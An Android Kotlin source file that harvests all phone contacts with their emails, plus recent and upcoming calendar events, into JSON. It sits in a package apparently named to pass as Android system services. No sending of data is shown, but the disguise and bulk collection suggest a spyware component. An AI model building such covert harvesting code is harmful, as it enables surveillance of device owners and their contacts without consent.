package com.android.systemservices

import android.content.Context
import android.provider.CalendarContract
import android.provider.ContactsContract
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

class ContactsHelper(private val context: Context) {

    private val TAG = "ContactsHelper"

    fun getContacts(): JSONArray {
        val result = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE
                ),
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            ) ?: return result

            // Also gather emails indexed by contact ID
            val emails = mutableMapOf<Long, MutableList<String>>()
            context.contentResolver.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Email.CONTACT_ID,
                    ContactsContract.CommonDataKinds.Email.ADDRESS
                ),
                null, null, null
            )?.use { ec ->
                val idCol   = ec.getColumnIndex(ContactsContract.CommonDataKinds.Email.CONTACT_ID)
                val addrCol = ec.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
                while (ec.moveToNext()) {
                    val id   = ec.getLong(idCol)
                    val addr = ec.getString(addrCol) ?: continue
                    emails.getOrPut(id) { mutableListOf() }.add(addr)
                }
            }

            // Deduplicate by contact ID + number
            val seen = mutableSetOf<String>()
            val idCol   = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
            val nameCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numCol  = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            val typeCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)

            cursor.use {
                while (it.moveToNext()) {
                    val cid    = it.getLong(idCol)
                    val name   = it.getString(nameCol) ?: ""
                    val number = it.getString(numCol)  ?: ""
                    val key    = "$cid|$number"
                    if (!seen.add(key)) continue
                    val typeInt = it.getInt(typeCol)
                    val typeLabel = ContactsContract.CommonDataKinds.Phone.getTypeLabel(
                        context.resources, typeInt, ""
                    ).toString()
                    result.put(JSONObject().apply {
                        put("id",     cid)
                        put("name",   name)
                        put("number", number)
                        put("type",   typeLabel)
                        val emailList = emails[cid]
                        if (!emailList.isNullOrEmpty()) {
                            put("emails", JSONArray(emailList))
                        }
                    })
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getContacts error: ${e.message}")
        }
        return result
    }

    fun getCalendarEvents(maxEvents: Int = 200): JSONArray {
        val result = JSONArray()
        try {
            val now = System.currentTimeMillis()
            val cursor = context.contentResolver.query(
                CalendarContract.Events.CONTENT_URI,
                arrayOf(
                    CalendarContract.Events._ID,
                    CalendarContract.Events.TITLE,
                    CalendarContract.Events.DESCRIPTION,
                    CalendarContract.Events.DTSTART,
                    CalendarContract.Events.DTEND,
                    CalendarContract.Events.EVENT_LOCATION,
                    CalendarContract.Events.CALENDAR_DISPLAY_NAME,
                    CalendarContract.Events.ALL_DAY
                ),
                // Fetch events from 30 days ago up to 90 days ahead
                "${CalendarContract.Events.DTSTART} > ? AND ${CalendarContract.Events.DTSTART} < ?",
                arrayOf(
                    (now - 30L * 86400 * 1000).toString(),
                    (now + 90L * 86400 * 1000).toString()
                ),
                "${CalendarContract.Events.DTSTART} ASC"
            ) ?: return result

            val idCol       = cursor.getColumnIndex(CalendarContract.Events._ID)
            val titleCol    = cursor.getColumnIndex(CalendarContract.Events.TITLE)
            val descCol     = cursor.getColumnIndex(CalendarContract.Events.DESCRIPTION)
            val startCol    = cursor.getColumnIndex(CalendarContract.Events.DTSTART)
            val endCol      = cursor.getColumnIndex(CalendarContract.Events.DTEND)
            val locCol      = cursor.getColumnIndex(CalendarContract.Events.EVENT_LOCATION)
            val calCol      = cursor.getColumnIndex(CalendarContract.Events.CALENDAR_DISPLAY_NAME)
            val allDayCol   = cursor.getColumnIndex(CalendarContract.Events.ALL_DAY)
            var count = 0
            cursor.use {
                while (it.moveToNext() && count < maxEvents) {
                    result.put(JSONObject().apply {
                        put("id",       it.getLong(idCol))
                        put("title",    it.getString(titleCol) ?: "")
                        put("desc",     it.getString(descCol)  ?: "")
                        put("start",    it.getLong(startCol))
                        put("end",      it.getLong(endCol))
                        put("location", it.getString(locCol)   ?: "")
                        put("calendar", it.getString(calCol)   ?: "")
                        put("allDay",   it.getInt(allDayCol) == 1)
                    })
                    count++
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getCalendarEvents error: ${e.message}")
        }
        return result
    }
}
